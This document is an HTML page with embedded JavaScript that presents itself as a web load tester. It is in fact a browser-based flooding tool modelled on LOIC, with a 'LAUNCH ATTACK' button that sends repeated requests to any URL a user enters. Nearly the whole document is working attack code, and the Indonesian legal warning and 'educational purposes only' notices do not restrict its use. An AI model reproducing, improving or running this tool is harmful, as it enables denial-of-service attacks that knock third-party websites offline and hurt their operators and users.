<!DOCTYPE html>
<html>
<head>
    <title>Web-Based Load Tester</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #000;
            color: #0f0;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            border: 3px solid #f00;
            padding: 20px;
            border-radius: 10px;
            background: #111;
        }
        h1 {
            color: #f00;
            text-align: center;
            text-shadow: 0 0 10px #f00;
        }
        .warning {
            background: #330000;
            border: 2px solid #ff0000;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
        }
        input, select, button {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: #222;
            color: #0f0;
            border: 2px solid #444;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            background: linear-gradient(45deg, #ff0000, #990000);
            color: white;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover {
            background: linear-gradient(45deg, #ff3333, #cc0000);
            transform: scale(1.02);
        }
        button:disabled {
            background: #333;
            cursor: not-allowed;
        }
        .status {
            display: flex;
            justify-content: space-between;
            margin: 20px 0;
        }
        .stat-box {
            background: #222;
            padding: 15px;
            border-radius: 5px;
            text-align: center;
            flex: 1;
            margin: 0 5px;
        }
        .log {
            background: #000;
            border: 2px solid #0f0;
            height: 300px;
            overflow-y: auto;
            padding: 15px;
            margin-top: 20px;
            font-family: monospace;
            font-size: 14px;
        }
        .log-entry {
            margin: 5px 0;
            padding: 3px;
        }
        .success { color: #0f0; }
        .error { color: #f00; }
        .info { color: #ff0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>‚ö†Ô∏è WEB LOAD TESTER ‚ö†Ô∏è</h1>
        
        <div class="warning">
            <strong>PERINGATAN HUKUM:</strong> Penggunaan alat ini terhadap server yang bukan milik Anda adalah tindakan kriminal yang dapat dikenai hukuman penjara dan denda miliaran rupiah sesuai UU ITE Pasal 32.
        </div>

        <div class="control-panel">
            <input type="url" id="target" placeholder="https://target-domain.com" required>
            
            <select id="method">
                <option value="GET">GET Request</option>
                <option value="POST">POST Request</option>
                <option value="HEAD">HEAD Request</option>
            </select>
            
            <div class="status">
                <div class="stat-box">
                    <div>Threads</div>
                    <input type="range" id="threads" min="1" max="50" value="10">
                    <span id="threadCount">10</span>
                </div>
                <div class="stat-box">
                    <div>Requests/Second</div>
                    <input type="range" id="rate" min="1" max="100" value="20">
                    <span id="rateCount">20</span>
                </div>
                <div class="stat-box">
                    <div>Duration (sec)</div>
                    <input type="range" id="duration" min="10" max="300" value="60">
                    <span id="durationCount">60</span>
                </div>
            </div>
            
            <button id="startBtn">üöÄ LAUNCH ATTACK</button>
            <button id="stopBtn" disabled>‚èπÔ∏è STOP ATTACK</button>
            <button id="flushBtn">üßπ CLEAR LOGS</button>
        </div>

        <div class="stats">
            <div class="stat-box">
                <div>Requests Sent</div>
                <div id="sentCount">0</div>
            </div>
            <div class="stat-box">
                <div>Success Rate</div>
                <div id="successRate">0%</div>
            </div>
            <div class="stat-box">
                <div>Attack Time</div>
                <div id="attackTime">00:00</div>
            </div>
        </div>

        <div class="log" id="log">
            <div class="log-entry info">System ready. Enter target URL above.</div>
        </div>
    </div>

    <script>
        class WebLOIC {
            constructor() {
                this.isAttacking = false;
                this.attackStart = null;
                this.interval = null;
                this.workers = [];
                this.stats = {
                    sent: 0,
                    success: 0,
                    failed: 0
                };
                
                this.initControls();
            }
            
            initControls() {
                // Slider updates
                document.getElementById('threads').addEventListener('input', (e) => {
                    document.getElementById('threadCount').textContent = e.target.value;
                });
                
                document.getElementById('rate').addEventListener('input', (e) => {
                    document.getElementById('rateCount').textContent = e.target.value;
                });
                
                document.getElementById('duration').addEventListener('input', (e) => {
                    document.getElementById('durationCount').textContent = e.target.value;
                });
                
                // Buttons
                document.getElementById('startBtn').addEventListener('click', () => this.startAttack());
                document.getElementById('stopBtn').addEventListener('click', () => this.stopAttack());
                document.getElementById('flushBtn').addEventListener('click', () => this.clearLogs());
                
                // Update attack timer
                setInterval(() => this.updateTimer(), 1000);
            }
            
            logMessage(message, type = 'info') {
                const logDiv = document.getElementById('log');
                const entry = document.createElement('div');
                entry.className = `log-entry ${type}`;
                entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
                logDiv.appendChild(entry);
                logDiv.scrollTop = logDiv.scrollHeight;
            }
            
            updateStats() {
                document.getElementById('sentCount').textContent = this.stats.sent.toLocaleString();
                const rate = this.stats.sent > 0 ? 
                    Math.round((this.stats.success / this.stats.sent) * 100) : 0;
                document.getElementById('successRate').textContent = `${rate}%`;
            }
            
            updateTimer() {
                if (this.isAttacking && this.attackStart) {
                    const elapsed = Math.floor((Date.now() - this.attackStart) / 1000);
                    const minutes = Math.floor(elapsed / 60).toString().padStart(2, '0');
                    const seconds = (elapsed % 60).toString().padStart(2, '0');
                    document.getElementById('attackTime').textContent = `${minutes}:${seconds}`;
                }
            }
            
            async sendRequest(target, method) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 5000);
                    
                    const response = await fetch(target, {
                        method: method,
                        mode: 'no-cors',
                        signal: controller.signal,
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate',
                            'DNT': '1',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '1',
                            'Cache-Control': 'max-age=0'
                        }
                    });
                    
                    clearTimeout(timeoutId);
                    this.stats.sent++;
                    this.stats.success++;
                    this.logMessage(`Request #${this.stats.sent} sent successfully`, 'success');
                    return true;
                } catch (error) {
                    this.stats.sent++;
                    this.stats.failed++;
                    this.logMessage(`Request #${this.stats.sent} failed: ${error.message}`, 'error');
                    return false;
                } finally {
                    this.updateStats();
                }
            }
            
            createWorker(target, method, rate) {
                return setInterval(async () => {
                    if (!this.isAttacking) return;
                    await this.sendRequest(target, method);
                }, 1000 / rate);
            }
            
            async startAttack() {
                const target = document.getElementById('target').value;
                const method = document.getElementById('method').value;
                const threads = parseInt(document.getElementById('threads').value);
                const rate = parseInt(document.getElementById('rate').value);
                const duration = parseInt(document.getElementById('duration').value) * 1000;
                
                // Validation
                if (!target) {
                    this.logMessage('Please enter a target URL', 'error');
                    return;
                }
                
                if (!target.startsWith('http')) {
                    this.logMessage('URL must start with http:// or https://', 'error');
                    return;
                }
                
                this.logMessage(`üö® STARTING ATTACK ON ${target}`, 'error');
                this.logMessage(`Configuration: ${threads} threads, ${rate} req/sec, ${duration/1000} seconds`, 'info');
                
                this.isAttacking = true;
                this.attackStart = Date.now();
                this.stats = { sent: 0, success: 0, failed: 0 };
                
                document.getElementById('startBtn').disabled = true;
                document.getElementById('stopBtn').disabled = false;
                
                // Create worker threads
                this.workers = [];
                for (let i = 0; i < threads; i++) {
                    const worker = this.createWorker(target, method, rate);
                    this.workers.push(worker);
                }
                
                // Auto stop after duration
                setTimeout(() => {
                    if (this.isAttacking) {
                        this.stopAttack();
                        this.logMessage('‚è∞ Attack duration completed', 'info');
                    }
                }, duration);
                
                this.logMessage('Attack launched successfully', 'success');
            }
            
            stopAttack() {
                this.isAttacking = false;
                
                // Clear all workers
                this.workers.forEach(worker => clearInterval(worker));
                this.workers = [];
                
                document.getElementById('startBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
                
                const totalTime = this.attackStart ? 
                    Math.round((Date.now() - this.attackStart) / 1000) : 0;
                
                this.logMessage(`üõë ATTACK STOPPED`, 'error');
                this.logMessage(`Results: ${this.stats.sent} total requests in ${totalTime} seconds`, 'info');
                this.logMessage(`Success: ${this.stats.success} | Failed: ${this.stats.failed}`, 'info');
                this.logMessage(`Average rate: ${Math.round(this.stats.sent / totalTime)} requests/second`, 'info');
            }
            
            clearLogs() {
                document.getElementById('log').innerHTML = 
                    '<div class="log-entry info">Logs cleared</div>';
            }
        }
        
        // Initialize when page loads
        window.addEventListener('DOMContentLoaded', () => {
            window.loic = new WebLOIC();
            document.getElementById('log').innerHTML += 
                '<div class="log-entry info">‚ö†Ô∏è FOR EDUCATIONAL PURPOSES ONLY ‚ö†Ô∏è</div>' +
                '<div class="log-entry info">‚ö†Ô∏è USE ONLY ON SERVERS YOU OWN ‚ö†Ô∏è</div>';
        });
    </script>
</body>
</html>